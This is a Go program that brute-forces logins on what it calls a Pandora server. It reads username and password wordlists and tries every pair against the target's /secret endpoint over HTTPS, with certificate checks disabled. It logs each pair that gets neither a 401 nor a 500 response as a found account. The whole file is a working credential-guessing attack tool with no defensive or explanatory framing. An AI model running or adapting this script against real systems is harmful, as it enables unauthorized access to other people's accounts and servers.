package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {

	target := flag.String("t", "", "Target host (IP or domain)")
	port := flag.Int("s", 0, "Port number for the Pandora server")
	users := flag.String("u", "", "File path to the list of usernames")
	passwords := flag.String("p", "", "File path to the password dictionary")
	flag.Parse()
	if *target == "" || *port == 0 || *users == "" || *passwords == "" {
		fmt.Println("Error: Missing required flags.")
		flag.Usage()
		os.Exit(1)
	}

	userDict, err := os.Open(*users)
	if err != nil {
		log.Fatal(err)
	}
	defer userDict.Close()
	userScanner := bufio.NewScanner(userDict)
	passwordsDict, err := os.Open(*passwords)
	if err != nil {
		log.Fatal(err)
	}
	defer passwordsDict.Close()
	body := []byte(`"secret-id":"secretID"`)
	for userScanner.Scan() {
		user := strings.TrimSpace(userScanner.Text())
		passwordsDict.Seek(0, 0)
		passwordScanner := bufio.NewScanner(passwordsDict)
		for passwordScanner.Scan() {
			password := strings.TrimSpace(passwordScanner.Text())
			re, err := sendHTTPRequest("GET", fmt.Sprintf("https://%s:%d/secret", *target, *port), user, password, string(body))
			if err == nil {
				if re.StatusCode != 401 && re.StatusCode != 500 {
					log.Printf("Account Found: Username: %s, Password: %s (Success)\n", user, password)
					break
				} else {
					log.Printf("Account Check - Username: %s, Password: %s\n", user, password)
				}
			}
		}
	}

}
func sendHTTPRequest(method, url, username, password string, body string) (response *http.Response, err error) {
	req, err := http.NewRequest(method, url, bytes.NewBufferString(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("username", username)
	req.Header.Set("password", password)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // This skips certificate verification
		},
	}

	client := &http.Client{
		Timeout:   time.Second * 10,
		Transport: tr,
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil

}
